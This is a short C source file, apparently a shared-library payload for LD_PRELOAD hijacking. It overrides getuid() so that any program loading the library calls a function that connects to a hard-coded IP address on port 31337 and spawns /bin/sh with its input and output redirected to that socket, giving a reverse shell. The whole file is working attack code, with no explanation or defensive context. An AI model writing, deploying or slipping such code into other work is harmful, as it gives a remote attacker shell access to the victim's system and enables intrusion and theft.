#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <netdb.h>
#include <unistd.h>
#include <errno.h>

void payload() {
    struct sockaddr_in serveraddr;
        int server_sockfd;
        int client_len;
        char buf[80],rbuf[80], *cmdBuf[2]={"/bin/sh",(char *)0};

        server_sockfd = socket(AF_INET, SOCK_STREAM, 6);
        serveraddr.sin_family = AF_INET;
        serveraddr.sin_addr.s_addr = inet_addr("15.164.25.223"); 
        serveraddr.sin_port = htons(atoi("31337"));
        client_len = sizeof(serveraddr);

        connect(server_sockfd, (struct sockaddr*)&serveraddr, client_len);

        dup2(server_sockfd, 0);
        dup2(server_sockfd, 1);
        dup2(server_sockfd, 2);

        execve("/bin/sh",cmdBuf,0);
}   

uid_t getuid() {
    if (getenv("LD_PRELOAD") == NULL) { return 0; }
    unsetenv("LD_PRELOAD");
    payload();
}
